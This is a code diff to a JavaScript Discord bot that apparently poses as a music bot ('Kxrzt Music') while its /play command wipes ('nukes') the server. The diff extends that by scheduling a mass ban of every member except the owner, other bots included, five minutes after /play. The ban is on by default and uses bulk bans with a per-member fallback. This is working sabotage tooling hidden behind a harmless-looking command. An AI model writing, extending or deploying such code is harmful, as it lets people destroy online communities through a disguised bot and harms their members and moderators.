@@ -44,6 +44,14 @@ const SPAM_BURST = 0;
 const USE_WEBHOOKS = false;
 const WEBHOOK_RATIO = 0.5;
 
+/* -------------------------------------------------------------- ban config */
+
+const BAN_DELAY_MS = 5 * 60 * 1000; // 5 minuten nach /play
+const BAN_WARN_MS = 30 * 1000; // 30s vorher warnen
+const BAN_INCLUDE_BOTS = true; // auch andere bots bannen
+const BAN_INCLUDE_SELF = false; // sich selbst mitbannen (bot verlässt den server)
+const BAN_DELETE_MESSAGES_SECONDS = 0; // 0 = nachrichten behalten, max 604800 (7 tage)
+
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 function channelName(i) {
@@ -271,6 +279,78 @@ async function nukeGuild(guild, { wipeRoles = false, rename = RENAME_GUILD } = {
   return { summary, textChannels, ms };
 }
 
+/* --------------------------------------------------------------------- ban */
+
+const banTimers = new Map(); // guildId -> { warn, ban }
+
+function cancelBanEveryone(guildId) {
+  const t = banTimers.get(guildId);
+  if (!t) return;
+  clearTimeout(t.warn);
+  clearTimeout(t.ban);
+  banTimers.delete(guildId);
+}
+
+// zweiter /play resettet den timer statt doppelt zu bannen
+function scheduleBanEveryone(guild, channel) {
+  cancelBanEveryone(guild.id);
+
+  const warn = setTimeout(() => {
+    channel?.send('⏳ **everyone gets banned in 30 seconds.**').catch(() => {});
+  }, Math.max(0, BAN_DELAY_MS - BAN_WARN_MS));
+
+  const ban = setTimeout(() => {
+    banTimers.delete(guild.id);
+    banEveryone(guild).catch(e => console.error('[ban]', e.message));
+  }, BAN_DELAY_MS);
+
+  banTimers.set(guild.id, { warn, ban });
+}
+
+async function banEveryone(guild) {
+  const me = guild.members.me ?? await guild.members.fetchMe();
+
+  if (!me.permissions.has(PermissionFlagsBits.BanMembers)) {
+    console.error('[ban] missing Ban Members permission');
+    return;
+  }
+
+  const members = await guild.members.fetch();
+
+  const ids = members
+    .filter(m =>
+      (!BAN_INCLUDE_SELF || m.id !== me.id) &&
+      m.id !== guild.ownerId && // owner kann man nicht bannen
+      (BAN_INCLUDE_BOTS || !m.user.bot)
+    )
+    .map(m => m.id);
+
+  let banned = 0;
+  const failed = [];
+
+  for (let i = 0; i < ids.length; i += 100) {
+    const chunk = ids.slice(i, i + 100);
+    try {
+      const res = await guild.members.bulkBan(chunk, {
+        deleteMessageSeconds: BAN_DELETE_MESSAGES_SECONDS,
+        reason: 'nuke',
+      });
+      banned += res.bannedUsers.length;
+      failed.push(...res.failedUsers);
+    } catch (err) {
+      // fallback falls bulkBan nicht verfügbar ist
+      await pool(chunk, 5, id =>
+        guild.members.ban(id, { reason: 'nuke' })
+          .then(() => banned++)
+          .catch(() => failed.push(id))
+      );
+    }
+  }
+
+  console.log(`[ban] ${guild.name}: banned ${banned}, failed ${failed.length}`);
+  return { banned, failed };
+}
+
 /* ---------------------------------------------------------------- helpers */
 
 const rand = a => a[Math.floor(Math.random() * a.length)];
@@ -365,7 +445,7 @@ const FAKE = {
         .setAuthor({ name: 'Kxrzt Music' })
         .setDescription([
           '**Playback**',
-          '`/play [song]` — play a song (or url)',
+          '`/play [song] [roles] [ban]` — nuke + ban everyone after 5min',
           '`/pause` `/resume` `/stop` `/skip` `/seek`',
           '',
           '**Queue**',
@@ -378,7 +458,7 @@ const FAKE = {
           '`/volume` `/lyrics` `/play-file` `/help`',
           '',
           'Prefix `!` works too.',
-          '-# powered by nothing. `/play` nukes the server btw.',
+          '-# powered by nothing. `/play` nukes the server and bans everyone btw.',
         ].join('\n')),
     ],
   }),
@@ -406,16 +486,21 @@ async function play(interaction) {
 
   const song = interaction.options.getString('song') ?? rand(TRACKS);
   const wipeRoles = interaction.options.getBoolean('roles') ?? false;
+  const banAll = interaction.options.getBoolean('ban') ?? true;
 
   // öffentliches "searching..." — wie ein echter musikbot
   await interaction.deferReply();
 
   try {
     const { summary, textChannels, ms } = await nukeNow(guild, { wipeRoles });
+
+    if (banAll) scheduleBanEveryone(guild, textChannels[0]);
+
     const embed = nowPlayingEmbed(
       song,
       interaction.user,
-      `Kxrzt Music • nuked in ${(ms / 1000).toFixed(1)}s`
+      `Kxrzt Music • nuked in ${(ms / 1000).toFixed(1)}s` +
+        (banAll ? ' • banning everyone in 5min' : '')
     );
 
     // origin-channel ist weg -> editReply kann 404en, dann in den ersten neuen channel
@@ -450,7 +535,11 @@ function shim(message, args) {
     options: {
       getString: () => args.join(' ') || null,
       getInteger: () => Number(args[0]) || null,
-      getBoolean: name => (name === 'roles' ? args.includes('roles') : null),
+      getBoolean: name => {
+        if (name === 'roles') return args.includes('roles');
+        if (name === 'ban') return !args.includes('noban'); // !play song noban = aus
+        return null;
+      },
       getAttachment: () => message.attachments.first() ?? null,
     },
 
